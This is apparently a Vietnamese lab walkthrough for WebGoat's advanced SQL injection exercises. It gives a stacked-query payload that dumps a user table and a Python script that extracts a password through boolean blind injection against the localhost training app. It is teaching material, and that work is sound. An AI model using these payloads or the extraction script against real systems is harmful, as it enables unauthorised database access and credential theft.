---
title: "(A3) SQL Injection - SQL Injection (Advanced) - Webgoat"
tag: "webgoat"
subtitle: " 🐐
  Bài viết này mình sẽ hướng dẫn các bạn làm phần (A3) SQL Injection - SQL Injection (Advanced)"
date: "21-3-2024"
id: "11"
---

- **Blind SQL** injection là một phương pháp tấn công vào các ứng dụng web thông qua việc lợi dụng lỗ hổng bảo mật trong việc xử lý cơ sở dữ liệu SQL. Trong kiểu tấn công này, kẻ tấn công cố gắng chèn các câu lệnh SQL vào các trường dữ liệu đầu vào của ứng dụng web để thực hiện các hành động không được ủy quyền hoặc thu thập thông tin từ cơ sở dữ liệu.
- Trong trường hợp blind SQL injection, kẻ tấn công không nhận được bất kỳ phản hồi trực tiếp nào từ hệ thống sau khi thực hiện một yêu cầu tấn công. Thay vào đó, họ phải dựa vào các biểu hiện gián tiếp từ hệ thống để suy luận thông tin về cơ sở dữ liệu.

- Cụ thể, kẻ tấn công có thể sử dụng các kỹ thuật như "boolean-based blind SQL injection" hoặc "time-based blind SQL injection". Trong boolean-based blind SQL injection, kẻ tấn công thực hiện các truy vấn SQL dựa trên các điều kiện logic và suy luận thông tin dựa trên câu trả lời đúng/sai từ hệ thống. Trong time-based blind SQL injection, kẻ tấn công thực hiện các truy vấn có thời gian chạy lâu hơn và suy luận thông tin dựa trên thời gian phản hồi từ hệ thống.
- Các hậu quả của blind SQL injection có thể rất nghiêm trọng, bao gồm việc lợi dụng quyền truy cập không được ủy quyền vào cơ sở dữ liệu, thu thập thông tin nhạy cảm hoặc thậm chí kiểm soát hoàn toàn hệ thống. Để ngăn chặn blind SQL injection, các nhà phát triển web cần chú ý đến việc kiểm tra và xử lý đúng các đầu vào người dùng, sử dụng các phương pháp an toàn trong việc truy xuất cơ sở dữ liệu như Prepared Statements hoặc ORM (Object-Relational Mapping), và thường xuyên cập nhật và kiểm tra mã nguồn để phát hiện và khắc phục các lỗ hổng bảo mật.

## 1. Try It! Pulling data from other tables

- Đề bài yêu cầu lấy tất cả dữ liệu của bảng `user_system_data` và lấy mật khẩu của Dave.
- Nhập câu lệnh sau vào ô Name là nhấn Get Account Info:

```json
'; SELECT * FROM user_system_data;--
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711014944/WebGoat/H46_ya1wem.png)

- Ta code thể thấy được mật khẩu của Dave là `passW0rD`, dán mật khẩu vào ô Password và nhấn Check Password là xong:
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711014945/WebGoat/H47_fcgm3n.png)

## 2. Login

- Ta đăng kí một tài khoản với Username là: `tom' AND substring(password, 1, 1)='t`, ta có thể suy ra trong password của Tom có một chữ là `t`:
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711014944/WebGoat/H48_fs50vr.png)
- Ta chạy chương trình Python sau gửi request để kiểm tra tất cả mật khẩu có thể có, thay đổi session_id tương ứng trên trình duyệt của bạn:

```python
import json,requests

def main():
    url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"
    webgoat_session_id = "0qexwJ47oTLOrGtzuYKYogZvulhhHESl-HYq07E1"
    header = {
        "Cookie": "JSESSIONID=" + webgoat_session_id,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "http://localhost:8080/WebGoat/start.mvc",
        "Origin": "http://localhost:8080",
        "Host": "localhost:8080",
        "Content-Length": "126",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
        "sec-ch-ua-platform": "macOS",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    password = ""
    for length in range(1, 25):
        for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            params = "username_reg=tom'+AND+substring(password%2C1%2C" + str(
                length) + ")%3D'" + password + letter + "&email_reg=test%40test.test&password_reg=test&confirm_password_reg=test"
            r = requests.put(url, headers=header, data=params)
            if "already exists" in r.text:
                password += letter
                print(password)
                break
            else:
                continue
    print("")
    print("")
    print("Password found: " + password)

if __name__ == "__main__":
    main()
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711014944/WebGoat/H49_tax4nz.png)

- Chạy sẽ hơn lâu, ta tìm được mật khẩu là `thisisasecretfortomonly`. Ta đăng nhập với Username là Tom và mật khẩu vừa tìm được:
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711014945/WebGoat/H50_rbviid.png)
